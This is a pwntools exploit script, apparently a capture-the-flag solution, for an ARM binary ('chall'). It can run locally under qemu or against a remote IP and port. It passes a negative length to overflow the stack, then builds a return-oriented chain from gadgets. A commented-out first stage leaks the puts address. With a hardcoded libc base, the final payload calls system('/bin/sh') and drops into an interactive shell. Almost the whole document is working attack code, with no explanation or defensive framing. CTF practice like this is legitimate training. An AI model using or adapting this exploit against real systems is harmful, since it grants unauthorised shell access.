from pwn import *
import sys
context.binary = "./chall"
#context.log_level = "debug"
context.terminal = ['tmux','sp','-h']

if sys.argv[1] == "r":
    p = remote("47.104.185.63", 8855)
elif sys.argv[1] == "l":
    # p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "your_binary"])
    p = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi", "./chall"])
else:
    # p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi", "your_binary"])
    p = process(["qemu-arm-static", "-g", "1235", "-L", "/usr/arm-linux-gnueabi", "./chall"])

elf = ELF("./chall")
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")
#0x00010758 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
#0x00010738 : add r4, r4, #1 ; ldr r3, [r5], #4 ; mov r2, sb ; mov r1, r8 ; mov r0, r7 ; blx r3
pop_r4_pc = 0x00010758
main = 0x0010628
'''
p.sendlineafter("len> ",str(-1))

payload = ''.ljust(36-4,'a') + p32(0x0001068C)
payload += p32(pop_r4_pc)
payload += p32(1)+p32(elf.got['puts'])
payload += p32(0)+p32(elf.got['puts'])
payload += p32(1)+p32(1)
payload += p32(1)+p32(0x0001043c)
payload += p32(elf.got['puts'])+p32(0x00010738)

p.sendlineafter("msg> ",payload)
addr = u32(p.recv(4))
print("addr:"+hex(addr))
'''


libc_base = 0xff6c68b8 - libc.symbols['puts']
str_bin_sh = libc_base + next(libc.search("/bin/sh"))
print("str_bin_sh:"+hex(str_bin_sh))
system = libc_base + libc.symbols['system']
print("system:"+hex(system))
print "libc_base:"+hex(libc_base)

p.sendlineafter("len> ",str(-1))

payload = ''.ljust(36-4,'a') + p32(0x0001068C)
payload += p32(pop_r4_pc)
payload += p32(1)+p32(1)
payload += p32(0)+p32(str_bin_sh)
payload += p32(1)+p32(1)
payload += p32(1)+p32(0x0001043c)
payload += p32(system)+p32(0x10744)

p.sendlineafter("msg> ",payload)

p.interactive()